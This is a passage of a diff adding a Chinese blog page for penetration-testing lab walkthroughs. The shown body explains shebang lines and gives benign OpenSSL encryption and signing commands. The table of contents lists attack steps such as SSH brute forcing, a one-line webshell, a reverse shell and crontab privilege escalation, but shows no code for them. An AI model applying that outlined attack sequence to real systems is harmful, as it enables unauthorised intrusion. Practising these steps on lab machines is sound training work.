+<li><strong>作用</strong>：当文件被赋予执行权限（<code>chmod +x script</code>）并<strong>直接运行</strong>（<code>./script</code>）时，内核读到这一行，就把后面路径 <code>/bin/bash</code> 当成解释器去启动，然后把脚本路径作为参数传给它。</li>
+<li><strong>效果</strong>：让用户可以像运行二进制一样运行文本脚本。</li>
+<li><strong>换解释器就改写路径</strong>：** <strong><code>#!/usr/bin/python3</code> → Python，</strong> **<code>#!/bin/sh</code> → 系统默认 shell（可能是 dash）。</li>
+</ul>
+<p><strong>示例</strong></p>
+<p><strong>bash</strong></p>
+<p><strong>复制</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ cat hello</span><br><span class="line">#!/bin/bash</span><br><span class="line">echo Hello $USER</span><br><span class="line"></span><br><span class="line">$ chmod +x hello</span><br><span class="line">$ ./hello          # 内核实际执行 /bin/bash ./hello</span><br><span class="line">Hello kali</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="二、-bin-bash-本身"><a href="#二、-bin-bash-本身" class="headerlink" title="二、/bin/bash 本身"></a>二、<code>/bin/bash</code> 本身</h3><ul>
+<li><strong>它就是 bash 可执行文件的真实路径。</strong></li>
+<li><strong>手工调用</strong>时，会开启<strong>新的 Bash 进程</strong>（子 shell）。</li>
+<li><strong>常见场景</strong><ul>
+<li>**交互式：直接敲 **<code>/bin/bash</code> 进子 shell，exit 退回。</li>
+<li><strong>指定解释器：</strong><code>/bin/bash script</code> 显式用 bash 跑脚本，<strong>忽略 shebang</strong>。</li>
+<li><strong>指定特性：</strong><code>/bin/bash --posix script</code> 或 <code>/bin/bash -c &#39;command ...&#39;</code>。</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<h3 id="提权结束"><a href="#提权结束" class="headerlink" title="提权结束"></a>提权结束</h3><p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131979.png" alt="image-20251106214319886"></p>
+<h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131980.png" alt="image-20251106214524377"></p>
+<h1 id="OpenSSL-相关内容"><a href="#OpenSSL-相关内容" class="headerlink" title="OpenSSL 相关内容"></a>OpenSSL 相关内容</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/fsq0827/article/details/99710052">OpenSSL 的基本使用教程(一）_openssl.exe 使用教程-CSDN 博客</a></p>
+<p><strong>是的，</strong><code>enc</code> 只做<strong>对称</strong>加&#x2F;解密（同一个密钥既加密又解密）。**  ** <strong>OpenSSL 把“非对称”操作（公钥加密、私钥解密、签名、验签）全部放在另外的子命令里，最常见的是：</strong></p>
+<ul>
+<li><code>rsautl</code> &#x2F; <code>pkeyutl</code> – 低层 RSA&#x2F;ECC 加解密、签名、验签</li>
+<li><code>dgst -sign / -verify</code> – 对文件做哈希再用私钥签名&#x2F;公钥验签</li>
+<li><code>cms</code> &#x2F; <code>smime</code> – 高层封装：数字信封、签名、PKCS#7&#x2F;CMS 格式</li>
+<li><code>genpkey</code> &#x2F; <code>rsa</code> &#x2F; <code>ec</code> – 生成私钥&#x2F;公钥对</li>
+</ul>
+<hr>
+<h3 id="1-对称-vs-非对称-快速对照"><a href="#1-对称-vs-非对称-快速对照" class="headerlink" title="1. 对称 vs 非对称 快速对照"></a>1. 对称 vs 非对称 快速对照</h3><table>
+<thead>
+<tr>
+<th><strong>维度</strong></th>
+<th><strong>symmetric (</strong><code>enc</code>)</th>
+<th><strong>asymmetric (RSA&#x2F;ECC 等)</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>密钥</strong></td>
+<td><strong>同一个密钥</strong></td>
+<td><strong>密钥对：公钥公开，私钥保密</strong></td>
+</tr>
+<tr>
+<td><strong>OpenSSL 入口</strong></td>
+<td><code>openssl enc</code></td>
+<td><code>openssl pkeyutl</code>&#x2F;<code>dgst -sign</code>&#x2F;<code>cms</code>…</td>
+</tr>
+<tr>
+<td><strong>常用场景</strong></td>
+<td><strong>文件、磁盘、备份加密</strong></td>
+<td><strong>密钥交换、数字签名、HTTPS 握手</strong></td>
+</tr>
+<tr>
+<td><strong>性能</strong></td>
+<td><strong>快（MB~GB&#x2F;s）</strong></td>
+<td><strong>慢（KB~MB&#x2F;s），只加密少量数据</strong></td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="2-非对称加-解密实战示例"><a href="#2-非对称加-解密实战示例" class="headerlink" title="2. 非对称加&#x2F;解密实战示例"></a>2. 非对称加&#x2F;解密实战示例</h3><h4 id="①-先生成密钥对"><a href="#①-先生成密钥对" class="headerlink" title="① 先生成密钥对"></a>① 先生成密钥对</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl genpkey -algorithm RSA -out private.pem -pkeyopt rsa_keygen_bits:2048</span><br><span class="line">openssl pkey -in private.pem -pubout -out public.pem</span><br></pre></td></tr></table></figure>
+
+<h4 id="②-公钥加密"><a href="#②-公钥加密" class="headerlink" title="② 公钥加密"></a>② 公钥加密</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl pkeyutl -encrypt -in plain.txt -pubin -inkey public.pem \</span><br><span class="line">                -out cipher.bin -pkeyopt rsa_padding_mode:oaep</span><br></pre></td></tr></table></figure>
+
+<h4 id="③-私钥解密"><a href="#③-私钥解密" class="headerlink" title="③ 私钥解密"></a>③ 私钥解密</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl pkeyutl -decrypt -in cipher.bin -inkey private.pem \</span><br><span class="line">                -out plain_again.txt -pkeyopt rsa_padding_mode:oaep</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>注意：RSA 只能加密比密钥长度短的数据（2048 bit 密钥 ≈ 190 字节左右），所以实际应用里会****先用随机对称密钥加密文件，再用 RSA 加密那个对称密钥</strong>——这就是 <code>cms</code> &#x2F; <code>smime</code> 做的“数字信封”。</p>
+</blockquote>
+<h4 id="④-一键数字信封（自动混合加密）"><a href="#④-一键数字信封（自动混合加密）" class="headerlink" title="④ 一键数字信封（自动混合加密）"></a>④ 一键数字信封（自动混合加密）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 加密：用对方公钥把 AES 会话密钥包起来</span><br><span class="line">openssl cms -encrypt -aes-256-cbc -in plain.txt -out cipher.p7 \</span><br><span class="line">            -recip public.pem</span><br><span class="line"></span><br><span class="line"># 解密：用己方私钥解开会话密钥再解密文件</span><br><span class="line">openssl cms -decrypt -in cipher.p7 -inkey private.pem \</span><br><span class="line">            -out plain_again.txt</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="3-非对称签名-验签（常用）"><a href="#3-非对称签名-验签（常用）" class="headerlink" title="3. 非对称签名&#x2F;验签（常用）"></a>3. 非对称签名&#x2F;验签（常用）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 签名：私钥 + 文件哈希</span><br><span class="line">openssl dgst -sha256 -sign private.pem -out file.sig file.txt</span><br><span class="line"></span><br><span class="line"># 验签：公钥 + 文件哈希</span><br><span class="line">openssl dgst -sha256 -verify public.pem -signature file.sig file.txt</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="4-一句话总结"><a href="#4-一句话总结" class="headerlink" title="4. 一句话总结"></a>4. 一句话总结</h3><ul>
+<li><code>enc</code> <strong>只管对称</strong>加解密。</li>
+<li><strong>非对称的“公钥加密、私钥解密、签名、验签”交给</strong>  ** **<code>pkeyutl</code>、<code>dgst -sign</code>、<code>cms</code> 等命令。</li>
+<li><strong>实际工程里****两者混合使用</strong>：非对称保护“对称密钥”，对称密钥再 bulk 加密数据——这就是 HTTPS、S&#x2F;MIME、PGP 的核心思想。</li>
+</ul>
+
+    </article>
+    
+    <div class="read-nums">
+      <!-- id 将作为查询条件 -->
+      <span id="2026/03/20/靶机精炼-思路为王（一）/" class="leancloud_visitors" data-flag-title="Your Article Title">
+        <em class="post-meta-item-text">浏览量</em>
+        <i class="leancloud-visitors-count"></i>
+      </span>
+    </div>
+    <div class="comments-intro">
+      <h2>评论区</h2>
+      <p>欢迎你留下宝贵的意见，昵称输入QQ号会显示QQ头像哦~</p>
+    </div>
+    <div id="vcomments" class="vcomments"></div>
+    
+  </div>
+  <div class="article-catelogue">
+    <div class="article-catelogue--wrapper">
+      <div class="catelogue catelogue-1">
+        <h3>目录</h3>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#W1R3S-1-0-1"><span class="toc-number">1.</span> <span class="toc-text">W1R3S 1.0.1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%EF%BC%8Cnmap-%E6%89%AB%E6%8F%8F%E4%B8%8E%E5%88%86%E6%9E%90%EF%BC%88%E7%B2%BE%EF%BC%89-%E5%8F%AF%E4%BB%A5%E6%89%AB%E4%B8%A4%E6%AC%A1%E7%9C%8B%E7%9C%8B%E6%98%AF%E5%90%A6%E4%B8%80%E8%87%B4"><span class="toc-number">1.1.</span> <span class="toc-text">一，nmap 扫描与分析（精）&lt; 可以扫两次看看是否一致 &gt;</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B%E5%92%8C%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%EF%BC%88%E5%8F%91%E7%8E%B0%E5%93%AA%E4%BA%9B%E7%AB%AF%E5%8F%A3%E6%98%AF%E5%BC%80%E6%94%BE%E7%9A%84%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.主机探测和端口扫描（发现哪些端口是开放的）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap-%E5%91%BD%E4%BB%A4%E4%B8%AD-sn-%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">Nmap 命令中-sn 的作用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF%E6%89%AB%E6%8F%8F%EF%BC%88%E9%87%8D%E4%B8%AD%E4%B9%8B%E9%87%8D%EF%BC%89"><span class="toc-number">1.2.1.</span> <span class="toc-text">2.详细信息扫描（重中之重）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-UDP-%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.2.</span> <span class="toc-text">3.UDP 扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%BC%8F%E6%B4%9E%E8%84%9A%E6%9C%AC%E7%9A%84%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.3.</span> <span class="toc-text">4.漏洞脚本的扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-IPv6-%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.4.</span> <span class="toc-text">5.IPv6 扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#IOXIDResolver-%E5%B7%A5%E5%85%B7%EF%BC%9A%E5%8F%91%E7%8E%B0%E8%AF%A5-IPv4-%E7%9A%84%E7%BD%91%E5%8D%A1%E6%9C%89%E6%B2%A1%E6%9C%89-IPv6-%E5%BC%80%E6%94%BE"><span class="toc-number">1.2.4.0.1.</span> <span class="toc-text">IOXIDResolver 工具：发现该 IPv4 的网卡有没有 IPv6 开放</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#nmap%EF%BC%9A%E6%89%AB%E6%8F%8F-IPv6-%E7%9A%84%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.2.4.0.2.</span> <span class="toc-text">nmap：扫描 IPv6 的端口</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#snmpwalk-%E5%B7%A5%E5%85%B7%EF%BC%88%E7%AE%80%E5%8D%95%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86%E5%8D%8F%E8%AE%AE-%E6%9E%9A%E4%B8%BE%EF%BC%89"><span class="toc-number">1.2.4.0.3.</span> <span class="toc-text">snmpwalk 工具（简单网络管理协议 枚举）</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows-%E4%B8%8B%E7%9A%84%E5%B7%A5%E5%85%B7"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">Windows 下的工具</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90%EF%BC%8C%E7%A1%AE%E5%AE%9A%E5%88%9D%E6%AD%A5%E7%9A%84%E6%B8%97%E9%80%8F%E4%BC%98%E5%85%88%E7%BA%A7%E5%92%8C%E7%AD%96%E7%95%A5"><span class="toc-number">1.2.5.</span> <span class="toc-text">攻击面分析，确定初步的渗透优先级和策略</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%EF%BC%8CFTP-%E6%B8%97%E9%80%8F%EF%BC%88%E7%B2%BE%EF%BC%89"><span class="toc-number">1.3.</span> <span class="toc-text">二，FTP 渗透（精）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-ftp-%E8%BF%9E%E6%8E%A5%E9%9D%B6%E6%9C%BA"><span class="toc-number">1.3.1.</span> <span class="toc-text">1.ftp 连接靶机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8F%91%E7%8E%B0%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E5%B9%B6%E5%85%A8%E9%83%A8%E4%B8%8B%E8%BD%BD"><span class="toc-number">1.3.2.</span> <span class="toc-text">2.发现目录下的文件并全部下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9F%A5%E7%9C%8B%E5%90%84%E4%B8%AA%E6%96%87%E4%BB%B6%E7%9A%84%E5%86%85%E5%AE%B9%E8%BF%9B%E8%A1%8C%E9%80%90%E4%B8%AA%E5%88%86%E6%9E%90"><span class="toc-number">1.3.3.</span> <span class="toc-text">3.查看各个文件的内容进行逐个分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%EF%BC%8C%E7%9C%8B%E4%B8%80%E4%B8%8B-3306-MySQL"><span class="toc-number">1.4.</span> <span class="toc-text">三，看一下 3306 MySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%EF%BC%8Cweb-%E6%B8%97%E9%80%8F%EF%BC%88%E7%B2%BE%EF%BC%89"><span class="toc-number">1.5.</span> <span class="toc-text">四，web 渗透（精）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%85%88%E7%9C%8B-80-%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.5.1.</span> <span class="toc-text">1.先看 80 端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4%EF%BC%88gobuster%EF%BC%89-%E4%B9%9F%E5%8F%AF%E4%BB%A5-dirb"><span class="toc-number">1.5.2.</span> <span class="toc-text">2.目录爆破（gobuster）&#x2F;也可以 dirb</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%88%E7%9C%8B-wordpress"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">先看 wordpress</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%8D%E7%9C%8B-cappa-CMS"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">再看 cappa  CMS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%EF%BC%8C22-%E7%AB%AF%E5%8F%A3%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3-ssh"><span class="toc-number">1.6.</span> <span class="toc-text">五，22 端口暴力破解 + ssh</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%EF%BC%8C%E6%80%BB%E7%BB%93"><span class="toc-number">1.7.</span> <span class="toc-text">六，总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JARBAS-Jenkins-%E6%B8%97%E9%80%8F%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3%EF%BC%8C%E4%B8%80%E4%B8%AA%E5%85%B8%E5%9E%8B-CMS-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A0%B7%E6%9C%AC%E3%80%82%EF%BC%88%E5%B0%9D%E8%AF%95%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E%EF%BC%9F%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">JARBAS - Jenkins 渗透原理详解，一个典型 CMS 渗透测试样本。（尝试其他漏洞？）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%EF%BC%8Cnmap-%E6%89%AB%E6%8F%8F"><span class="toc-number">2.1.</span> <span class="toc-text">一，nmap 扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">2.1.2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF%E6%89%AB%E6%8F%8F"><span class="toc-number">2.1.3.</span> <span class="toc-text">详细信息扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UDP-%E6%89%AB%E6%8F%8F"><span class="toc-number">2.1.4.</span> <span class="toc-text">UDP 扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E6%89%AB%E6%8F%8F"><span class="toc-number">2.1.5.</span> <span class="toc-text">脚本扫描</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%EF%BC%8Cweb-%E6%B8%97%E9%80%8F"><span class="toc-number">2.2.</span> <span class="toc-text">二，web 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E5%85%A5%E7%BD%91%E9%A1%B5%EF%BC%8C%E9%AA%8C%E8%AF%81%E6%89%AB%E6%8F%8F%E5%87%BA%E6%9D%A5%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-number">2.2.1.</span> <span class="toc-text">进入网页，验证扫描出来的信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9C%8B%E5%90%84%E7%AB%AF%E5%8F%A3%E5%AF%B9%E5%BA%94%E7%9A%84%E9%A1%B5%E9%9D%A2"><span class="toc-number">2.2.2.</span> <span class="toc-text">看各端口对应的页面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9C%8B%E4%B8%80%E4%B8%8B-robots-txt-%E7%9B%AE%E5%BD%95"><span class="toc-number">2.2.3.</span> <span class="toc-text">看一下 robots.txt 目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4"><span class="toc-number">2.2.4.</span> <span class="toc-text">目录爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE-access-html%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%8A%A0%E5%AF%86%E7%9A%84%E5%87%AD%E6%8D%AE"><span class="toc-number">2.2.5.</span> <span class="toc-text">访问&#x2F;access.html，发现加密的凭据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E7%99%BB%E5%BD%95"><span class="toc-number">2.2.6.</span> <span class="toc-text">尝试登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%EF%BC%8C%E5%B0%9D%E8%AF%95%E8%8E%B7%E5%8F%96%E5%88%9D%E7%BA%A7%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90"><span class="toc-number">2.2.7.</span> <span class="toc-text">利用漏洞，尝试获取初级系统权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#uname-a"><span class="toc-number">2.2.8.</span> <span class="toc-text">uname -a</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ip-a"><span class="toc-number">2.2.9.</span> <span class="toc-text">ip a</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ifconfig"><span class="toc-number">2.2.10.</span> <span class="toc-text">ifconfig</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dpkg-l"><span class="toc-number">2.2.11.</span> <span class="toc-text">dpkg -l</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-l"><span class="toc-number">2.2.12.</span> <span class="toc-text">sudo -l</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%EF%BC%8Ccrontab-%E8%87%AA%E5%8A%A8%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="toc-number">2.3.</span> <span class="toc-text">三，crontab 自动任务提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SickOS1-1-%E7%A9%BF%E8%B6%8A-Squid-%E4%BB%A3%E7%90%86%E7%9A%84-CMS-%E6%B8%97%E9%80%8F-%E8%A7%A3%E6%B3%95%E4%B8%80"><span class="toc-number">3.</span> <span class="toc-text">SickOS1.1 - 穿越 Squid 代理的 CMS 渗透-解法一</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap-%E6%89%AB%E6%8F%8F"><span class="toc-number">3.1.</span> <span class="toc-text">nmap 扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0-1"><span class="toc-number">3.1.1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-1"><span class="toc-number">3.1.2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF%E6%89%AB%E6%8F%8F-1"><span class="toc-number">3.1.3.</span> <span class="toc-text">详细信息扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UDP-%E6%89%AB%E6%8F%8F-1"><span class="toc-number">3.1.4.</span> <span class="toc-text">UDP 扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%84%9A%E6%9C%AC%E6%89%AB%E6%8F%8F"><span class="toc-number">3.1.5.</span> <span class="toc-text">漏洞脚本扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">3.1.6.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Squid-%E4%BB%A3%E7%90%86%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E7%BD%AE"><span class="toc-number">3.2.</span> <span class="toc-text">Squid 代理分析与设置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-%E7%95%8C%E9%9D%A2%E6%9F%A5%E7%9C%8B"><span class="toc-number">3.2.1.</span> <span class="toc-text">web 界面查看</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-squid"><span class="toc-number">3.2.2.</span> <span class="toc-text">什么是 squid</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4-1"><span class="toc-number">3.2.3.</span> <span class="toc-text">目录爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%86-3128-%E4%BD%9C%E4%B8%BA%E4%BB%A3%E7%90%86%E8%BF%9B%E8%A1%8C%E7%88%86%E7%A0%B4%E6%89%AB%E6%8F%8F"><span class="toc-number">3.2.4.</span> <span class="toc-text">将 3128 作为代理进行爆破扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86"><span class="toc-number">3.2.5.</span> <span class="toc-text">设置代理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB-%E6%B8%97%E9%80%8F"><span class="toc-number">3.3.</span> <span class="toc-text">WEB 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE-3128-%E7%AB%AF%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AD%90%E7%9B%AE%E5%BD%95"><span class="toc-number">3.3.1.</span> <span class="toc-text">访问 3128 端口及其子目录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#robots"><span class="toc-number">3.3.1.1.</span> <span class="toc-text">&#x2F;robots</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A%EF%BC%9A"><span class="toc-number">3.3.2.</span> <span class="toc-text">解释：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">3.3.3.</span> <span class="toc-text">总结：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E5%AE%83%E4%B8%8D%E6%98%AF%EF%BC%9A"><span class="toc-number">3.3.4.</span> <span class="toc-text">✅ 它不是：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E5%AE%83%E6%98%AF%EF%BC%9A"><span class="toc-number">3.3.5.</span> <span class="toc-text">✅ 它是：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E5%B8%B8%E8%A7%81%E7%94%A8%E6%B3%95%E7%A4%BA%E4%BE%8B%EF%BC%9A"><span class="toc-number">3.3.6.</span> <span class="toc-text">✅ 常见用法示例：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E5%B0%8F%E6%8F%90%E7%A4%BA%EF%BC%9A"><span class="toc-number">3.3.7.</span> <span class="toc-text">✅ 小提示：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%80%BB%E7%BB%93%E4%B8%80%E5%8F%A5%E8%AF%9D%EF%BC%9A"><span class="toc-number">3.3.8.</span> <span class="toc-text">✅ 总结一句话：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#wolfcms"><span class="toc-number">3.3.8.0.1.</span> <span class="toc-text">&#x2F;wolfcms</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%89%BE%E7%AE%A1%E7%90%86%E5%91%98%E8%B7%AF%E5%BE%84%EF%BC%8C%E5%8D%B3%E7%99%BB%E9%99%86%E8%B7%AF%E5%BE%84"><span class="toc-number">3.3.8.0.1.1.</span> <span class="toc-text">找管理员路径，即登陆路径</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%99%BB%E5%BD%95"><span class="toc-number">3.3.8.0.1.2.</span> <span class="toc-text">如何登录</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%9C%89%E7%94%A8%E4%BF%A1%E6%81%AF"><span class="toc-number">3.3.8.0.1.3.</span> <span class="toc-text">查看有用信息</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.3.8.0.1.4.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E5%88%9D%E5%A7%8B-shell"><span class="toc-number">3.4.</span> <span class="toc-text">获得初始 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">3.4.1.</span> <span class="toc-text">一句话木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E5%8F%8D%E5%BC%B9-shell"><span class="toc-number">3.4.2.</span> <span class="toc-text">成功反弹 shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E6%8F%90%E6%9D%83"><span class="toc-number">3.5.</span> <span class="toc-text">尝试提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 